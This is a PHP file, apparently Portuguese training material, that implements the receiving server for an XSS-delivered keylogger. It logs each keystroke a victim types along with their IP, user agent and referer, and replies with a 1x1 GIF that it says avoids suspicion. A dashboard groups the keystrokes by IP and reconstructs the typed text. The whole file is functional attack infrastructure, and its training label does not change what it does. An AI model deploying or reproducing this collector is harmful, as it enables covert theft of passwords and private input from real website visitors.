<?php
// ─────────────────────────────────────────────────────────────
//  collector.php — Servidor de recolha de keylog (FORMAÇÃO)
//  Recebe teclas exfiltradas via XSS e guarda em ficheiro + BD
// ─────────────────────────────────────────────────────────────

$logfile = __DIR__ . '/keylog.txt';

// ─── Recebe e regista a tecla ─────────────────────────────────
if (isset($_GET['k'])) {
    $ip     = $_SERVER['REMOTE_ADDR'];
    $ua     = $_SERVER['HTTP_USER_AGENT'] ?? 'desconhecido';
    $ref    = $_SERVER['HTTP_REFERER']    ?? 'sem referer';
    $tecla  = $_GET['k'];
    $quando = date('Y-m-d H:i:s');

    // Guarda em ficheiro de log
    $linha = "[$quando] IP=$ip | TECLA=" . urldecode($tecla) . " | REF=$ref | UA=$ua\n";
    file_put_contents($logfile, $linha, FILE_APPEND | LOCK_EX);

    // Responde com imagem 1x1 transparente (não levanta suspeitas)
    header('Content-Type: image/gif');
    echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
    exit;
}

// ─── Painel de visualização dos logs ─────────────────────────
// Acede a collector.php?ver=1 para ver os logs recolhidos
if (isset($_GET['ver'])) {
?>
<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="refresh" content="5">
    <title>Painel de Keylog – Formação</title>
    <style>
        body { font-family: monospace; background: #1a1a2e; color: #e0e0e0; padding: 20px; }
        h1 { color: #e94560; }
        .aviso { background: #f39c12; color: #000; padding: 8px 14px; border-radius: 4px; margin-bottom: 20px; font-family: Arial; }
        table { width: 100%; border-collapse: collapse; font-size: 13px; }
        th { background: #e94560; color: white; padding: 8px; text-align: left; }
        td { padding: 7px 8px; border-bottom: 1px solid #333; }
        tr:hover { background: #16213e; }
        .tecla { background: #0f3460; color: #e94560; padding: 2px 6px; border-radius: 3px; font-weight: bold; }
        .btn { background: #e94560; color: white; padding: 6px 14px; border: none; cursor: pointer; border-radius: 4px; font-size: 13px; margin-right: 8px; text-decoration: none; }
        .refresh { color: #aaa; font-size: 12px; }
    </style>
</head>
<body>
    <h1>🎹 Painel de Recolha de Keylog</h1>
    <div class="aviso">⚠️ Apenas para fins de formação. Auto-refresh a cada 5 segundos.</div>

    <p>
        <a class="btn" href="?ver=1">🔄 Atualizar</a>
        <a class="btn" href="?limpar=1" onclick="return confirm('Apagar todos os logs?')">🗑 Limpar logs</a>
        <span class="refresh">Atualização automática em 5s</span>
    </p>

<?php
    // Limpar logs
    if (isset($_GET['limpar'])) {
        file_put_contents($logfile, '');
        echo "<p style='color:#2ecc71'>✅ Logs apagados.</p>";
    }

    if (!file_exists($logfile) || filesize($logfile) === 0) {
        echo "<p style='color:#aaa'>Ainda não há dados recolhidos. Aguarda que a vítima escreva algo...</p>";
    } else {
        $linhas = array_filter(explode("\n", file_get_contents($logfile)));

        // Agrupa por IP para mostrar sessões
        $sessoes = [];
        foreach ($linhas as $l) {
            preg_match('/IP=([^\s|]+)/', $l, $mip);
            preg_match('/TECLA=([^\s|]+)/', $l, $mt);
            preg_match('/\[([^\]]+)\]/', $l, $mdata);
            $ip_val = $mip[1] ?? '?';
            $sessoes[$ip_val][] = [
                'data'  => $mdata[1] ?? '?',
                'tecla' => urldecode($mt[1] ?? '?'),
                'linha' => $l,
            ];
        }

        echo "<h2 style='color:#e94560'>📡 " . count($linhas) . " tecla(s) recolhida(s) de " . count($sessoes) . " IP(s)</h2>";

        foreach ($sessoes as $ip_val => $entradas) {
            $texto = implode('', array_column($entradas, 'tecla'));
            echo "<h3 style='color:#2ecc71'>🖥 IP: $ip_val — texto reconstituído:</h3>";
            echo "<div style='background:#0f3460;padding:12px;border-radius:6px;margin-bottom:10px;font-size:16px;letter-spacing:1px'>$texto</div>";

            echo "<table><tr><th>Data/Hora</th><th>Tecla</th></tr>";
            foreach ($entradas as $e) {
                echo "<tr><td>{$e['data']}</td><td><span class='tecla'>{$e['tecla']}</span></td></tr>";
            }
            echo "</table><br>";
        }
    }
?>
</body>
</html>
<?php
    exit;
}
?>
